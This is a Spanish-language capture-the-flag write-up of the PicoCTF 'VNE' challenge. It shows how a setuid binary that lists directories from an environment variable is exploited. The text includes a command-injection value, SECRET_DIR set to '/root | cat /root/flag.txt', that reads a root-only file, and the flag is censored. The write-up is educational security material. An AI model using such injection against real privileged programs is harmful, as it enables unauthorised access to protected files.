# VNE

*dificultad*: media

*Conocimientos básicos*:

- SSH
- Ejecución remota de comandos / inyección de código
- Comandos básicos Linux

*Descripción*:

"We've got a binary that can list directories as root, try it out !!
Additional details will be available after launching your challenge instance."

------------

El desafío se inicia a través de una instancia de una máquina proporcionada por la infraestructura de PicoCTF, al iniciar la instancia se proporcionan las credenciales y la conexión a utilizar.

Se debe conectar por SSH utilizando las credenciales para el usuario ctf-player, por lo cual, usando linux, utilizamos el comando:
```
 $ ssh saturn.picoctf.net -p 50714 -l ctf-player
```
Una vez conectados se presenta una máquina Ubuntu 20.04.3 con kernel 6.5.0-1023 montada sobre AWS.

Si realizamos ls descubrimos que existe un unico archivo dentro de nuestra carpeta, siendo este el binario que mencionan en la descripción.

Al utilizar el binario de manera cruda y directa utilizando ./bin, este responde con el error:
```
$ Error: SECRET_DIR environment variable is not set
```
Esto nos otorga la pista que trabajaremos con variables de entorno en linux, por lo que un enfoque rápido puede consistir en intentar leer un directorio privilegiado estableciendo dicha variable de entorno:
```
$ export SECRET_DIR="/root"
```
Si esto funciona, entonces podremos leer cualquier parte del sistema que se nos antoje, por lo cual, probamos el binario otra vez, recibiendo el output:

  ```
  Listing the content of /root as root:
  flag.txt
  ```
Con esto ya tenemos la idea principal de la carpeta objetivo a la cual atacar, sin embargo, no podemos realizar una lectura de manera directa, en este caso, como sabemos que el desafío consiste en explotar un binario, podemos inspeccionar el archivo para encontrar posibles vulnerabilidades en el código, miremos su naturaleza y metadatos usando el comando file:

  ```
    $ file bin
      bin: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,         
      BuildID[sha1]=202cb71538089bb22aa22d5d3f8f77a8a94a826f, for GNU/Linux 3.2.0, not stripped
  ```

Podría ser un binario compilado desde un código fuente en C, por lo cual podríamos debuggear el archivo, pero dichas herramientas no están presentes en la máquina, un enfoque podría consistir en traerse el archivo usando scp, no obstante, podría perderse mucho tiempo.

Pero, y si la variable de entorno en si pudiera ejecutar código? podríamos probar a ejecutar otros comandos dentro del string, si el código por debajo no sanitiza el input y nos permite enviar cualquier string, entonces esto se podría estar agregando al final del string de un ls realizado por el programa, sumemos entonces otro comando a la variable:

 ```
  $ export SECRET_DIR=""/root | cat /root/flag.txt""
 ```

Si funciona, nos daría el contenido del archivo flag.txt, por lo cual, ejecutamos el binario y vemos si podemos ejecutar el comando:

```
$ ./bin
  Listing the content of /root | cat /root/flag.txt as root:
  picoCTF{---REDACTED_BY_ZARCOPHAGE---}
```

El comando se ejecuta, por lo cual, acabamos de explotar nuestra inyección de código satisfactoriamente.

Sanitize your inputs pls

nota: flag censurada para evitar spoilear el desafío
